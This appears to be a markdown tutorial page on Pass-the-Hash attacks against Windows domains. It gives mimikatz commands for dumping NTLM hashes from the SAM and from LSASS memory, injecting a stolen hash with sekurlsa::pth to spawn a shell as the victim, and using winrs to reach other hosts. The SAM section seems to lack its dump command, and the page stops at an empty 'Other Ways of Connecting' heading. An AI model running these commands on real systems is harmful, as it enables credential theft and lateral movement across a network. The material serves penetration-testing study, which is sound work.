The **`NTLM`** **Challenge** sent during Authentication can be responded to just by knowing the **Password Hash.** This means we can Authenticate without requiring the plaintext password to be known. 

Instead of having to crack **NTLM Hashes**, if the Windows Domain is configured to use NTLM Authentication, we can **`Pass-the-Hash` (PtH)** and Authenticate Successfully.


<br/>

### SAM

:::info This method will only get Hashes from `Local Users` on the machine. `No Domain User's` hashes will be available.

:::


```batch
:: Extracting NTLM Hashes from Local SAM
privilege::debug
token::elevate
```

### LSASS

:::info This method will extract any NTLM Hashes for `Local Users` and any `Domain User` that has recently Logged onto the Machine.

:::

```batch
:: Extracting NTLM Hashes from LSASS Memory
privilege::debug
token::elevate
sekurlsa::msv 
```
<br/>

### Using The Hashes

We can use the **`Extracted Hashes`** to perform a **Pass-the-Hash** Attack by using **`mimikatz`** to Inject an Access Token for the Victim User on a **Reverse Shell or any other Command.**

If we run the **`whoami`** Command on this Shell, it will still show us the Original User before doing **PtH**, but any Command run from here will actually use the **Credentials Injected** using **PtH**.

```batch
:: Reverts the Previous Token
token::revert

:: Pass-the-Hash
sekurlsa::pth /user:USER /domain:TARGET /ntlm:HASH /run:"Command/PAYLOAD To Run"

:: Command Example
/run:"cmd.exe"
```

<br/>

Once we have a **Command Prompt** with the Credentials Loaded we can use `winrs` to connect to another **TARGET** on the Domain since the Credentials are **Injected** into our Session.

```batch
:: The [Username - Password] Fields are not Necessary because the Credentials are already Injected
winrs.exe -r:TARGET cmd
```


<br/>

### Other Ways of Connecting

We can use these **Tools** to connect to the **Target.**
